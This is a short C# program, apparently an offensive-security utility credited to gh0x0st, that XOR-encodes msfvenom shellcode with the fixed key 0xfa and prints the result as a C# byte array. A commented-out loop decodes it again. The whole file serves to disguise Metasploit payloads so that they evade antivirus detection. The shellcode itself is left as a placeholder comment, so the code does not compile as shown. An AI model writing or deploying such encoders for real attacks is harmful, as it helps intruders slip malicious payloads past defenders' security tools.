//XOR shellcode encoder 
//encrypt payload & add decryptor 
//full credit goes to gh0x0st 


using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XorCoder
{
    public class Program
    {
        public static void Main(string[] args)
        {
            byte[] buf = // msfvenom payload shellcode -f csharp

            // Encode the payload with XOR (fixed key)
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            int totalCount = encoded.Length;
            for (int count = 0; count < totalCount; count++)
            {
                byte b = encoded[count];

                if ((count + 1) == totalCount) // Dont append comma for last item
                {
                    hex.AppendFormat("0x{0:x2}", b);
                }
                else
                {
                    hex.AppendFormat("0x{0:x2}, ", b);
                }

                if ((count + 1) % 15 == 0)
                {
                    hex.Append("\n");
                }
            }

            Console.WriteLine($"XOR payload (key: 0xfa):");
            Console.WriteLine($"byte[] buf = new byte[{buf.Length}] {{\n{hex}\n}};");

            //// Decode the XOR payload
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            //}

        }
    }
}
